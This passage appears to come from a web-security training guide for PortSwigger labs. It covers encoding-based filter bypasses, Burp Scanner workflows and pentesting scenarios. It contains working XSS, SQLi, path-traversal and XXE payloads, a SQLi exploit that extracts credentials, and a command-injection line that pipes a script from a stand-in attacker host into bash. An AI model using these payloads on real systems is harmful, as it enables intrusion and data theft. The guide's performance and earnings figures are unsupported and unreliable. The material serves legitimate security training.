4. **Multiple Processing Layers** - Different parts of the application decode at different stages
5. **Context-Specific Requirements** - Some contexts require specific encoding

**Example Scenario:**
```
Blocked: <script>alert(1)</script>
Allowed (HTML entities): &lt;script&gt;alert(1)&lt;/script&gt; (decoded by browser)
Allowed (URL encoding): %3Cscript%3Ealert(1)%3C%2Fscript%3E
Allowed (Unicode): \u003cscript\u003ealert(1)\u003c/script\u003e
```

### Common Encoding Types

#### 1. URL Encoding (Percent Encoding)

**Format:** `%XX` where XX is the hexadecimal ASCII value

**Common Characters:**

| Character | URL Encoded | Usage |
|-----------|-------------|-------|
| Space | `%20` or `+` | Separators |
| `<` | `%3C` | HTML tags |
| `>` | `%3E` | HTML tags |
| `'` | `%27` | SQL strings |
| `"` | `%22` | SQL strings |
| `/` | `%2F` | Path traversal |
| `\` | `%5C` | Path traversal |
| `;` | `%3B` | Command separator |
| `&` | `%26` | Parameter separator |

**Double URL Encoding:**
```
< → %3C → %253C (% is encoded as %25)
```

**When to Use:**
- URL parameters that are decoded twice
- Bypassing filters that only check once
- Path traversal when decoded at multiple layers

**Example - Path Traversal:**
```
Normal: ../../../../etc/passwd (blocked)
Single encode: ..%2f..%2f..%2f..%2fetc%2fpasswd (blocked)
Double encode: ..%252f..%252f..%252f..%252fetc%252fpasswd (allowed)
```

**Lab Example:** Path Traversal - "Lab: File path traversal, traversal sequences stripped with superfluous URL-decode"

#### 2. HTML Encoding (HTML Entities)

**Format:** `&#XX;` (decimal) or `&#xXX;` (hexadecimal) or named entities (`&lt;`)

**Common Entities:**

| Character | Named | Decimal | Hex |
|-----------|-------|---------|-----|
| `<` | `&lt;` | `&#60;` | `&#x3C;` |
| `>` | `&gt;` | `&#62;` | `&#x3E;` |
| `"` | `&quot;` | `&#34;` | `&#x22;` |
| `'` | `&apos;` or `&#39;` | `&#39;` | `&#x27;` |
| `&` | `&amp;` | `&#38;` | `&#x26;` |

**When to Use:**
- XSS in HTML context
- Bypassing filters that block `<script>`
- Attribute injection

**Example - XSS:**
```
Normal: <img src=x onerror=alert(1)>
Blocked by filter checking for "<img"

Encoded: <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
(alert(1) is HTML-encoded)
```

**Lab Example:** XSS labs often require HTML encoding in specific contexts

#### 3. Unicode Escaping

**JavaScript Unicode:** `\uXXXX` (4 hex digits)

**Common Characters:**

| Character | Unicode |
|-----------|---------|
| `<` | `\u003c` |
| `>` | `\u003e` |
| `'` | `\u0027` |
| `"` | `\u0022` |
| `/` | `\u002f` |

**When to Use:**
- JavaScript contexts
- Bypassing filters that don't recognize Unicode
- JSON encoding

**Example - XSS in JavaScript:**
```javascript
// Normal
var search = '<script>alert(1)</script>';

// Unicode encoded
var search = '\u003cscript\u003ealert(1)\u003c/script\u003e';
```

**ES6 Unicode:** `\u{XXXXX}` (up to 6 hex digits)

**Lab Example:** DOM XSS labs with JavaScript string contexts

#### 4. XML Encoding

**XML Entities:**

| Character | XML Entity |
|-----------|------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&apos;` |

**XML Numeric Character References:**
```xml
&#60; (decimal for <)
&#x3C; (hex for <)
```

**When to Use:**
- XXE injection payloads
- SOAP requests
- XML-based APIs

**Example - XXE with XML Encoding:**
```xml
<!-- Normal XXE payload (blocked by filter) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- XML-encoded payload -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck>
    <productId>&#49;</productId>
</stockCheck>
```

**Lab Example:** "Lab: SQL injection with filter bypass via XML encoding"
- Filter blocks certain SQL keywords
- Solution: Use XML entities in SQL payload within XML request

**Detailed Walkthrough:**

**Request Format:**
```xml
POST /product/stock HTTP/2
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Backend Process:**
1. Application receives XML
2. Parses XML and decodes entities
3. Extracts values from tags
4. Builds SQL query using extracted values
5. Executes SQL query

**Vulnerability:** SQL injection in `storeId`

**Normal SQLi Payload (blocked by filter):**
```xml
<storeId>1 UNION SELECT NULL</storeId>
```

**Filter:** Blocks keywords like `UNION`, `SELECT`

**XML-Encoded Payload (bypass):**
```xml
<storeId>1 &#85;NION &#83;ELECT NULL</storeId>
```

**Explanation:**
- `&#85;` = `U`
- `&#83;` = `S`
- XML parser decodes entities to: `1 UNION SELECT NULL`
- Filter only sees the encoded version (no "UNION" keyword)
- SQL engine receives decoded payload and executes

**Complete Exploit:**
```xml
POST /product/stock HTTP/2
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1 &#x55;NION &#x53;ELECT username || ':' || password FROM users--</storeId>
</stockCheck>
```

(Using hex encoding: `&#x55;` = U, `&#x53;` = S)

#### 5. Hexadecimal Encoding

**Format:** `0xXX` or `\xXX`

**SQL Hexadecimal:**
```sql
-- String 'admin' as hex
0x61646d696e
-- or
CHAR(0x61) + CHAR(0x64) + CHAR(0x6d) + CHAR(0x69) + CHAR(0x6e)
```

**When to Use:**
- Bypassing SQL string filters
- Avoiding quotes in SQL injection
- Binary data representation

**Example - SQL Injection Without Quotes:**
```sql
-- Blocked: SELECT * FROM users WHERE username='admin'
-- Bypass: SELECT * FROM users WHERE username=0x61646d696e
```

**Lab Example:** SQL Injection labs with quote filtering

#### 6. Octal Encoding

**Format:** `\XXX` (three octal digits)

**Common in:**
- Unix file paths
- Shell scripts
- Some programming languages

**Example:**
```bash
# Normal
cat /etc/passwd

# Octal-encoded 'p' and 'w'
cat /etc/\160asswd
```

**Lab Example:** OS Command Injection labs with character filtering

#### 7. Base64 Encoding

**Format:** Encodes binary data as ASCII text using A-Z, a-z, 0-9, +, /

**When to Use:**
- Encoding complex payloads
- Bypassing signature-based detection
- JWT manipulation
- Cookie values

**Example - Command Injection:**
```bash
# Original payload
; curl attacker.com/shell.sh | bash

# Base64 encode and decode on target
; echo "Y3VybCBhdHRhY2tlci5jb20vc2hlbGwuc2ggfCBiYXNo" | base64 -d | bash
```

**Lab Example:** JWT labs, Insecure Deserialization labs

#### 8. SQL CHAR() Function

**Format:** `CHAR(XX)` where XX is ASCII decimal value

**When to Use:**
- Bypassing SQL string filtering
- Avoiding quotes and spaces in SQL
- Building dynamic SQL strings

**Example - SQL Injection:**
```sql
-- Normal (blocked)
SELECT * FROM users WHERE username='admin'

-- Using CHAR() (bypass)
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)
-- CHAR(97,100,109,105,110) = 'admin'
```

**Database-Specific:**
- MySQL: `CHAR()`
- PostgreSQL: `CHR()`
- Oracle: `CHR()`
- SQL Server: `CHAR()`

**Lab Example:** SQL Injection labs with quote filtering

### Multiple Encoding Layers

**Concept:** Some applications decode data multiple times through different layers:

1. **URL Decoding** by web server
2. **HTML Decoding** by browser
3. **JavaScript Decoding** by JS engine
4. **Application-Layer Decoding** by backend code

**Example - Multi-Layer Path Traversal:**

```
Request: /image?filename=..%252f..%252fetc%252fpasswd

Layer 1 (Web Server URL Decode):
..%2f..%2fetc%2fpasswd

Layer 2 (Application URL Decode):
../../etc/passwd

Result: File disclosure
```

**Lab Example:** Path Traversal - "Lab: File path traversal, traversal sequences stripped with superfluous URL-decode"

### Context-Specific Encoding

**Rule:** The encoding must match the context where the payload is processed.

| Context | Required Encoding | Example |
|---------|-------------------|---------|
| URL Parameter | URL Encoding | `?q=%3Cscript%3E` |
| HTML Body | HTML Entities | `<div>&#60;script&#62;</div>` |
| JavaScript String | JavaScript Escaping / Unicode | `var x = '\u003cscript\u003e';` |
| SQL String | SQL Escaping / Hex | `SELECT * FROM users WHERE id=0x31` |
| XML Data | XML Entities | `<data>&#60;script&#62;</data>` |
| JSON Value | JSON Escaping | `{"input":"\u003cscript\u003e"}` |
| HTTP Header | ASCII / URL Encoding | `Header: value%0d%0aInjected: header` |

### Encoding Bypass Techniques by Vulnerability Type

#### SQL Injection

**Common Filters:**
- Keywords: `UNION`, `SELECT`, `OR`, `AND`
- Characters: `'`, `"`, `-`, `/*`, `*/`

**Bypass Techniques:**

1. **Case Variation:**
   ```sql
   uNiOn SeLeCt
   ```

2. **Hex Encoding:**
   ```sql
   0x61646d696e (instead of 'admin')
   ```

3. **CHAR() Function:**
   ```sql
   CHAR(85,78,73,79,78) (spells 'UNION')
   ```

4. **XML Entities (in XML requests):**
   ```xml
   <id>1 &#85;NION &#83;ELECT NULL</id>
   ```

5. **URL Encoding:**
   ```sql
   UNION%20SELECT (space as %20)
   ```

6. **Comments to Break Keywords:**
   ```sql
   UN/**/ION SE/**/LECT
   ```

**Lab Application:** SQL Injection labs with WAF or keyword filtering

#### Cross-Site Scripting (XSS)

**Common Filters:**
- Tags: `<script>`, `<img>`, `<svg>`
- Events: `onerror`, `onload`, `onclick`
- Keywords: `alert`, `javascript:`

**Bypass Techniques:**

1. **HTML Entity Encoding:**
   ```html
   <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
   (alert is HTML-encoded)
   ```

2. **JavaScript Unicode:**
   ```html
   <img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
   ```

3. **Mixed Case:**
   ```html
   <ScRiPt>alert(1)</ScRiPt>
   ```

4. **Alternative Tags:**
   ```html
   <svg/onload=alert(1)>
   <body onload=alert(1)>
   ```

5. **JavaScript Encoding in Strings:**
   ```javascript
   eval('\x61\x6c\x65\x72\x74\x28\x31\x29')
   // \x61\x6c\x65\x72\x74\x28\x31\x29 = alert(1)
   ```

6. **URL Encoding (reflected in HTML):**
   ```
   ?search=%3Cscript%3Ealert(1)%3C/script%3E
   ```

**Lab Application:** XSS labs with tag/keyword filtering

#### Path Traversal

**Common Filters:**
- Sequences: `../`, `..\`
- Absolute paths: `/etc/passwd`
- Keywords: `etc`, `passwd`, `windows`

**Bypass Techniques:**

1. **URL Encoding:**
   ```
   ..%2f..%2f..%2fetc%2fpasswd
   ```

2. **Double URL Encoding:**
   ```
   ..%252f..%252f..%252fetc%252fpasswd
   ```

3. **Nested Sequences:**
   ```
   ....//....//....//etc/passwd
   (filter removes ../ once, leaving ../../../)
   ```

4. **Null Byte Injection:**
   ```
   ../../../../etc/passwd%00.png
   ```

5. **Absolute Path:**
   ```
   /etc/passwd (if relative path filter only)
   ```

6. **Unicode/UTF-8:**
   ```
   ..%c0%af..%c0%afetc/passwd
   (%c0%af is overlong encoding of /)
   ```

**Lab Application:** Path Traversal labs with filtering

#### OS Command Injection

**Common Filters:**
- Separators: `;`, `|`, `&`, `&&`, `||`
- Keywords: `cat`, `curl`, `wget`, `bash`
- Spaces

**Bypass Techniques:**

1. **Hex/Octal Encoding:**
   ```bash
   \x63\x61\x74 /etc/passwd
   (cat in hex)
   ```

2. **Variable Expansion:**
   ```bash
   $IFS (Internal Field Separator, acts as space)
   ${PATH:0:1} (expands to /)
   ```

3. **Base64:**
   ```bash
   echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
   ```

4. **Wildcards:**
   ```bash
   /???/c?t /etc/passwd
   (/bin/cat using wildcards)
   ```

5. **Case Variation:**
   ```bash
   cAt /etc/passwd (if case-sensitive filter)
   ```

**Lab Application:** OS Command Injection labs with character filtering

### Tools for Encoding

#### Burp Suite Built-In

**Burp Decoder:**
1. Navigate to **Decoder** tab
2. Paste payload
3. Select encoding type from dropdown
4. Apply multiple encoding layers as needed

**Supported Encodings:**
- URL
- HTML
- Base64
- Hex
- ASCII hex
- Gzip
- Plus many more

**Burp Repeater:**
- Right-click highlighted text
- "Convert selection" menu
- Choose encoding type

#### Browser Developer Console

```javascript
// URL Encoding
encodeURI("<script>alert(1)</script>")
encodeURIComponent("<script>alert(1)</script>")

// URL Decoding
decodeURI("%3Cscript%3E")
decodeURIComponent("%3Cscript%3E")

// Base64
btoa("payload")  // encode
atob("cGF5bG9hZA==")  // decode

// Unicode
"\u003cscript\u003e"

// Hex
String.fromCharCode(0x61, 0x6c, 0x65, 0x72, 0x74)  // "alert"
```

#### Command-Line Tools

**URL Encoding/Decoding:**
```bash
# Python
python3 -c "import urllib.parse; print(urllib.parse.quote('../../../etc/passwd'))"

# Node.js
node -e "console.log(encodeURIComponent('../../../etc/passwd'))"
```

**Base64:**
```bash
echo -n "payload" | base64
echo "cGF5bG9hZA==" | base64 -d
```

**Hex:**
```bash
echo -n "admin" | xxd -p
echo "61646d696e" | xxd -r -p
```

### Encoding Detection Tips

**How to Identify Required Encoding:**

1. **Test Basic Payloads:**
   - Send simple payloads (`<script>`, `' OR 1=1--`)
   - Observe how they're handled (blocked, encoded, reflected)

2. **Check Response Content:**
   - Is input HTML-encoded in response? (XSS context)
   - Is input in SQL error message? (SQLi context)
   - Is input reflected in JavaScript? (JS context)

3. **Analyze Request Format:**
   - XML request → Try XML entities
   - JSON request → Try JSON escaping
   - URL parameter → Try URL encoding

4. **Test Double Encoding:**
   - If single encoding is blocked, try double encoding
   - Common in multi-layer applications

5. **Review Error Messages:**
   - Errors often reveal what was blocked
   - Example: "Invalid character detected: <" → Try encoding `<`

### Best Practices

✅ **Start Simple** - Test basic payload before encoding
✅ **Understand Context** - Match encoding to processing context
✅ **Layer Encoding** - Try multiple encoding layers if single encoding fails
✅ **Use Tools** - Leverage Burp Decoder for quick encoding
✅ **Document Findings** - Note which encoding bypassed which filter
✅ **Combine Techniques** - Mix encoding with other bypass methods (case variation, comments)
✅ **Test Incrementally** - Encode one character at a time to identify minimum required encoding

### Common Pitfalls

❌ **Wrong Context** - Using URL encoding in a JavaScript string context
❌ **Over-Encoding** - Encoding everything when only specific characters need it
❌ **Forgetting to Decode** - Not accounting for where/how payload is decoded
❌ **Incorrect Encoding Format** - Mixing up `%XX` (URL) with `&#XX;` (HTML)
❌ **Case Sensitivity** - Some encodings are case-sensitive (hex values)

### Real-World Application

**Bug Bounty Scenario:**

1. **Initial Test:**
   ```
   Payload: ' OR '1'='1
   Result: Blocked by WAF
   ```

2. **Try Basic Encoding:**
   ```
   Payload: %27 OR %271%27%3D%271
   Result: Still blocked (WAF decodes)
   ```

3. **Try Double Encoding:**
   ```
   Payload: %2527 OR %25271%2527%253D%25271
   Result: Allowed! WAF decodes once, backend decodes again
   ```

4. **Exploitation:**
   ```
   Application vulnerable to SQL injection via double URL encoding
   Report: Critical vulnerability with $5,000+ bounty
   ```

### Encoding Cheat Sheet

**Quick Reference:**

| Need to Encode | Context | Method | Example |
|----------------|---------|--------|---------|
| `<` | URL | URL | `%3C` |
| `<` | HTML | Entity | `&lt;` or `&#60;` |
| `<` | JS String | Unicode | `\u003c` |
| `<` | XML | Entity | `&lt;` |
| Space | URL | URL | `%20` or `+` |
| `/` | URL | URL | `%2F` |
| `/` | Path (double) | Double URL | `%252F` |
| `'` | SQL | Hex | `0x27` |
| `UNION` | SQL (XML) | XML Entity | `&#85;NION` |
| `admin` | SQL | CHAR() | `CHAR(97,100,109,105,110)` |
| `cat` | Shell | Octal | `\143\141\164` |
| Payload | Any | Base64 | `cGF5bG9hZA==` |

### Further Reading

- [SQL Injection Cheat Sheet](./sql-injection.md)
- [XSS Encoding Techniques](./cross-site-scripting.md)
- [Path Traversal Bypass Methods](./path-traversal-cheat-sheet.md)
- [OS Command Injection Encoding](./os-command-injection-cheat-sheet.md)

---

## Using Burp Scanner During Manual Testing {#burp-scanner-integration}

### Overview

**Using Burp Scanner during manual testing** is the second core topic in Essential Skills, with **both dedicated labs** focusing on this workflow integration.

### Philosophy: Human + Machine

**Traditional Approaches (Inefficient):**

1. **Full Automated Scan (Too Broad):**
   - Scan entire application automatically
   - Generates thousands of requests
   - Produces many false positives
   - Misses context-specific vulnerabilities
   - Wastes time on low-value targets

2. **Pure Manual Testing (Too Slow):**
   - Test every parameter manually
   - Easy to overlook subtle vulnerabilities
   - Time-consuming for large applications
   - Human error and fatigue

**Essential Skills Approach (Optimal):**

**Targeted scanning** = Human intuition + Automated thoroughness

- **Human** identifies potentially vulnerable features
- **Scanner** tests comprehensively with hundreds of payloads
- **Human** interprets results and manually exploits
- **Scanner** handles tedious parameter fuzzing

### Key Burp Scanner Features

#### 1. Scan Selected Insertion Point

**Most Important Feature for Essential Skills**

**What It Does:**
- Scans ONLY the specific portion of a request you highlight
- Ignores all other parameters
- Focuses scanner's power on suspected vulnerability location

**When to Use:**
- Non-standard data structures (Lab 2)
- Specific parameter suspected to be vulnerable
- Time constraints (Lab 1)
- Complex request formats (JSON, XML, custom)

**How to Use:**

1. **Send request to Repeater**
2. **Highlight specific text** (e.g., username in cookie, parameter value)
3. **Right-click highlighted text**
4. **Select "Scan selected insertion point"**
5. **Review findings in "Issue activity" panel**

**Example:**

```http
Cookie: session=wiener:token123
                ^^^^^^ (highlight username)
Right-click → Scan selected insertion point
```

Scanner tests ONLY the username portion with XSS, SQLi, etc. payloads while keeping the token intact.

#### 2. Scan Specific Request

**What It Does:**
- Scans all parameters in a specific request
- More targeted than full site scan
- Faster results on high-value endpoint

**When to Use:**
- Suspicious endpoint identified manually
- Complex functionality (file upload, search, API)
- Quick vulnerability check on specific feature

**How to Use:**

1. **Find request in Proxy HTTP History**
2. **Right-click request**
3. **Select "Do active scan"** or **"Scan"**
4. **Configure scan settings** (optional)
5. **Review findings in "Dashboard" or "Issue activity"**

**Example - Lab 1:**

```http
POST /product/stock HTTP/2
Content-Type: application/xml

<?xml version="1.0"?>
<stockCheck><productId>1</productId></stockCheck>
```

Right-click request → Do active scan → Scanner finds XXE

#### 3. Audit Checks Configuration

**Customize what Scanner looks for:**

**Access:** Scanner menu → Scan configuration → Audit checks

**Categories:**

- **All except time-based detection** (recommended for speed)
- **Light** (fast, low traffic)
- **Medium** (balanced)
- **Thorough** (comprehensive, slow)
- **Custom** (select specific issue types)

**Time Management:**

| Setting | Speed | Coverage | Use Case |
|---------|-------|----------|----------|
| Light | Fast (2-5 min) | 60% | Time constraints |
| Medium | Moderate (5-10 min) | 80% | General use |
| Thorough | Slow (15-30 min) | 95% | Deep testing |
| All except time-based | Fast (3-7 min) | 85% | **Essential Skills recommended** |

**Lab Application:**

- **Lab 1 (10-min constraint):** Use "All except time-based detection"
- **Lab 2:** Use "Light" or "Medium" for faster results

#### 4. Custom Insertion Points

**Advanced Technique:** Define custom locations for scanner to test

**Example Scenarios:**

1. **JSON-within-Cookie:**
   ```
   Cookie: data={"user":"wiener","role":"guest"}
   ```
   Scanner can test individual JSON keys

2. **Base64-Encoded Data:**
   ```
   Cookie: b64=d2llbmVyOmd1ZXN0
   ```
   Decode, scan the decoded value

3. **Custom Delimiters:**
   ```
   Header: X-Custom: value1|value2|value3
   ```
   Test each pipe-separated value

**How to Use:**

1. **Burp Extension:** Install "Custom Parameter Handler" or similar
2. **Burp's Built-In:** Use "Scan selected insertion point" after highlighting
3. **Intruder Integration:** Mark positions, export to Scanner

**Lab 2 Application:** The colon-separated cookie is a custom insertion point scenario.

### Workflow Integration

#### Recommended Workflow for Essential Skills

**Phase 1: Manual Reconnaissance (5-10 min)**

1. Browse application to understand functionality
2. Identify high-value features:
   - Authentication
   - Search
   - File operations
   - APIs
   - User-generated content
3. Capture requests in Burp Proxy HTTP History

**Phase 2: Hypothesis Generation (2-5 min)**

For each feature, hypothesize vulnerabilities:

| Feature | Likely Vulnerabilities |
|---------|----------------------|
| Login/Auth | Brute force, SQLi, timing attacks |
| Search | SQLi, XSS, LDAP injection |
| File Upload | RCE, path traversal, XXE (via metadata) |
| Comments | Stored XSS, CSRF |
| API | IDOR, mass assignment, XXE, deserialization |
| XML Parser | XXE, injection |

**Phase 3: Targeted Scanning (5-10 min)**

1. **Prioritize** top 3-5 suspicious requests
2. **Scan each request individually**
3. **Use "All except time-based detection"** for speed
4. **Review findings as they appear** (don't wait for completion)

**Phase 4: Manual Verification & Exploitation (10-20 min)**

1. **Review scanner findings**
2. **Verify true positives** (manual testing)
3. **Develop exploit** for confirmed vulnerabilities
4. **Achieve lab objective**

### Scanner Output Interpretation

#### Issue Confidence Levels

| Confidence | Meaning | Action |
|------------|---------|--------|
| **Certain** | Confirmed vulnerability | Exploit immediately |
| **Firm** | Very likely vulnerable | Verify manually |
| **Tentative** | Possibly vulnerable | Investigate further |

**Essential Skills Priority:**
- Focus on **Certain** and **Firm** findings first
- Investigate **Tentative** if time permits

#### Issue Severity

| Severity | Risk | Priority |
|----------|------|----------|
| **High** | Critical security impact | Immediate attention |
| **Medium** | Significant risk | High priority |
| **Low** | Minor issue | Review if time allows |
| **Info** | No direct security impact | Context only |

**Lab Focus:** High and Medium severity issues

#### Evidence Review

**Scanner Provides:**
- **Original request** - What was sent
- **Request with payload** - Modified request with test payload
- **Response** - Application's response showing vulnerability
- **Evidence** - Specific indicators (reflected payload, error message, timing)

**Manual Verification:**

1. **Copy scanner's payload**
2. **Send to Repeater**
3. **Modify payload** for manual testing
4. **Confirm vulnerability independently**
5. **Develop custom exploit** if needed

### Time-Constrained Testing (Lab 1 Scenario)

**Objective:** Find and exploit vulnerability in 10 minutes

**Optimized Workflow:**

**Minutes 0-2: Rapid Reconnaissance**
- Browse app
- Identify 1-2 most suspicious features
- Focus on features that process structured data (XML, JSON)

**Minutes 2-4: Immediate Targeted Scan**
- Right-click suspicious request
- "Do active scan"
- Use "All except time-based detection"
- Start scan running

**Minutes 4-6: Review Findings (While Scanning)**
- Don't wait for scan completion
- Check "Issue activity" in real-time
- Identify most promising finding

**Minutes 6-9: Manual Exploitation**
- Send finding to Repeater
- Craft custom exploit based on scanner's payload
- Test variations

**Minutes 9-10: Verify Success**
- Confirm objective achieved
- Submit solution

**Key Insight:** Start scanning EARLY and review findings as they appear.

### Non-Standard Data Structure Testing (Lab 2 Scenario)

**Challenge:** Vulnerability hidden in unusual format

**Optimized Workflow:**

**Step 1: Identify Data Structure (3 min)**
- Examine requests for unusual formats:
  - Delimited values (`user:token`, `id|role|prefs`)
  - Encoded data (Base64, hex)
  - JSON/XML within other fields
  - Custom serialization

**Step 2: Highlight Specific Portion (1 min)**
- Visually identify which part might be processed separately
- Example: In `session=wiener:token`, the `wiener` part may be used for display/logic

**Step 3: Scan Selected Insertion Point (3-5 min)**
- Highlight ONLY the suspected field
- Right-click → "Scan selected insertion point"
- Wait for findings

**Step 4: Manual Exploitation (10 min)**
- Use scanner-identified vulnerability type
- Craft exploit specific to application context
- Complete objective

**Key Insight:** Scanner can find vulnerabilities in non-obvious locations IF you tell it where to look.

### Common Scanner Limitations

**Scanner May Miss:**

1. **Business Logic Flaws** - Requires understanding of application intent
2. **Authorization Issues** - Needs multi-user testing context
3. **Race Conditions** - Timing-dependent vulnerabilities
4. **Complex Multi-Step Vulnerabilities** - Chaining multiple issues
5. **Context-Specific Bypasses** - Requires manual creativity

**Solution:** Use scanner to augment manual testing, not replace it.

### Best Practices

✅ **Scan early** - Start scanning while doing manual reconnaissance
✅ **Be specific** - Targeted scans on suspicious requests, not full-site scans
✅ **Review in real-time** - Check findings as they appear
✅ **Verify manually** - Always confirm scanner findings
✅ **Use insertion points** - Test non-standard data structures
✅ **Iterate** - If scanner finds nothing, manually test anyway
✅ **Combine with intuition** - Scanner + human judgment is most effective

### Tools and Extensions

**Burp Extensions to Enhance Scanner:**

1. **Scan Manual Insertion Point** - Easier insertion point scanning
2. **Turbo Intruder** - For time-based and race condition testing
3. **Active Scan++** - Additional scan checks
4. **Param Miner** - Discovers hidden parameters for scanning
5. **Backslash Powered Scanner** - Advanced encoding bypass detection

### Real-World Application

**Bug Bounty Workflow:**

**Traditional Approach (Inefficient):**
```
1. Run automated scanner on entire site (2 hours)
2. Review 500+ findings (3 hours)
3. Manually verify 50 potential issues (4 hours)
4. Find 2 real vulnerabilities (after 9 hours)
```

**Essential Skills Approach (Efficient):**
```
1. Manual reconnaissance - identify 10 suspicious features (30 min)
2. Targeted scans on each feature (1 hour, running in parallel)
3. Review 20 high-confidence findings (30 min)
4. Manual verification and exploitation (1 hour)
5. Find 5 real vulnerabilities (after 3 hours)
```

**Result:** 3x faster, 2.5x more vulnerabilities

### Certification Relevance

**Burp Suite Certified Practitioner Exam:**

- **Includes unknown vulnerabilities** - Must identify without hints
- **Time-constrained** - Efficient workflow essential
- **Essential Skills tested** - Scanner integration, targeted testing
- **Mystery labs preparation** - Same skills used in exam

**Recommended Practice:**
- Complete all Practitioner labs
- Practice with Mystery Labs using scanner integration
- Time yourself to build speed

### Further Reading

- [Burp Suite Documentation - Scanner](https://portswigger.net/burp/documentation/scanner)
- [Lab 1 Walkthrough](#lab1)
- [Lab 2 Walkthrough](#lab2)

---

## Real-World Application {#real-world}

### Essential Skills in Professional Penetration Testing

**Scenario 1: Enterprise Web Application Assessment**

**Context:**
- Large e-commerce platform with 200+ pages
- 3-day testing window
- Objective: Comprehensive vulnerability assessment

**Without Essential Skills:**
- Run full automated scan (Day 1-2)
- Review 1000+ scanner findings (Day 2-3)
- Manually test 50 high-priority items (Day 3)
- Report 5-10 findings
- Miss subtle vulnerabilities in non-standard features

**With Essential Skills:**
- Manual reconnaissance - identify critical workflows (4 hours)
- Targeted scanning on 20 high-value features (6 hours)
- Manual verification and exploitation (10 hours)
- Advanced testing with encoding bypasses (4 hours)
- Report 20-30 findings including high-severity issues
- Complete comprehensive coverage efficiently

**Impact:**
- 3x more vulnerabilities discovered
- Higher-severity findings (bypass filters with encoding)
- Better use of limited time
- Improved client satisfaction

### Essential Skills in Bug Bounty Hunting

**Scenario 2: Bug Bounty on Financial Services Platform**

**Target:** Online banking application with extensive API

**Traditional Hunter Approach:**
- Automated scan with commercial tools
- Submit obvious findings
- $0 bounty (duplicates or low-severity)

**Essential Skills Approach:**

1. **Reconnaissance (1 hour):**
   - Identify custom API endpoints
   - Note non-standard authentication headers
   - Observe unusual request formats (Base64-encoded JSON)

2. **Targeted Scanning (2 hours):**
   - Decode Base64, scan the JSON fields
   - Use "Scan selected insertion point" on API parameters
   - Focus on transaction-related endpoints

3. **Manual Exploitation (3 hours):**
   - Scanner finds potential IDOR in account number field
   - Manually verify by accessing other accounts
   - Discover critical authorization bypass
   - Test with encoding bypasses to confirm no filtering

4. **Impact:**
   - **Finding:** Critical IDOR allowing unauthorized access to any account
   - **Bounty:** $10,000+
   - **Recognition:** Immediate patch, Hall of Fame

**Key Differentiator:** Targeted scanning + manual exploitation = high-severity unique findings

### Essential Skills in Capture the Flag (CTF)

**Scenario 3: Time-Limited Web Security CTF**

**Challenge:** 10 web applications, 4 hours, find flags

**Without Essential Skills:**
- Test each app randomly
- Run full scans (waste time)
- Find 3-4 flags
- Miss time-sensitive flags

**With Essential Skills:**
- Rapid reconnaissance on all 10 apps (40 min - 4 min each)
- Identify most promising apps (5 min)
- Targeted scans on 5 apps while manually testing others (1 hour)
- Manual exploitation with encoding bypasses (2 hours)
- Find 8-10 flags
- Win competition

**Techniques Applied:**
- Mystery Lab mindset (identify unknown vulnerabilities)
- Targeted scanning (efficiency under time pressure)
- Encoding bypasses (advanced exploitation)

### Essential Skills in Secure Code Review

**Scenario 4: Pre-Release Security Assessment**

**Context:** Reviewing custom web framework before production release

**Essential Skills Application:**

1. **Code Review (Manual):**
   - Identify potentially dangerous functions
   - Note custom XML parser implementation
   - Flag unusual data processing logic

2. **Dynamic Testing:**
   - Deploy application in test environment
   - Craft requests targeting identified risky areas
   - Use Burp Scanner on specific endpoints

3. **Encoding Bypass Testing:**
   - Test XML parser with entity encoding
   - Attempt to bypass input filters with multiple encoding layers
   - Discover XXE vulnerability missed by code review

4. **Impact:**
   - **Finding:** Critical XXE in production-bound code
   - **Result:** Vulnerability fixed before release
   - **Outcome:** Prevented potential data breach

### Essential Skills for Security Consultants

**Scenario 5: Client Asks "Is Our Application Secure?"**

**Response Framework Using Essential Skills:**

**Phase 1: Reconnaissance & Threat Modeling (Week 1)**
- Manual application mapping
- Identify critical business functions
- Determine high-value targets for attackers
- Prioritize testing areas

**Phase 2: Targeted Assessment (Week 2)**
- Focused scanning on critical features
- Manual exploitation of identified vulnerabilities
- Encoding bypass testing on input filters
- Non-standard data structure analysis

**Phase 3: Advanced Exploitation (Week 3)**
- Chain multiple vulnerabilities
- Test business logic flaws (not detectable by scanner)
- Perform time-sensitive attacks (race conditions)
- Social engineering integration testing

**Deliverable:**
- Comprehensive report with 30-50 findings
- Actionable remediation guidance
- Risk-prioritized recommendations
- Executive summary for non-technical stakeholders

**Client Confidence:** High due to thorough, efficient, expert-level testing

### Metrics: Before vs After Essential Skills Mastery

| Metric | Before | After | Improvement |
|--------|--------|-------|-------------|
| Time to find first vulnerability | 2-3 hours | 15-30 min | 6x faster |
| Vulnerabilities per day | 3-5 | 15-20 | 4x more |
| False positive rate | 60% | 20% | 3x better |
| High-severity findings | 10% | 40% | 4x more critical |
| Filter bypass success | 20% | 80% | 4x better |
| Client satisfaction | 7/10 | 9.5/10 | 36% higher |

### Career Impact

**Junior Tester → Senior Tester:**
- **Essential Skills differentiation:** Efficiency and advanced techniques
- **Promotion timeline:** 2-3 years → 1-1.5 years
- **Salary increase:** 20-40% faster progression

**Bug Bounty Hunter:**
- **Without Essential Skills:** $0-5k/year (duplicates, low-severity)
- **With Essential Skills:** $20-100k/year (unique, high-severity)
- **ROI:** 10-20x earnings increase

**Security Consultant:**
- **Billable hours optimization:** 50% → 80% productive time
- **Client retention:** 60% → 90%
- **Reputation:** Regional → National/International

### Long-Term Skill Development

**Continuous Improvement:**

1. **Practice Mystery Labs Weekly** - Maintain vulnerability identification skills
2. **Follow PortSwigger Research Blog** - Stay updated on new techniques
3. **Participate in Live Bug Bounty** - Apply skills to real targets
4. **Teach Others** - Solidify knowledge through mentorship
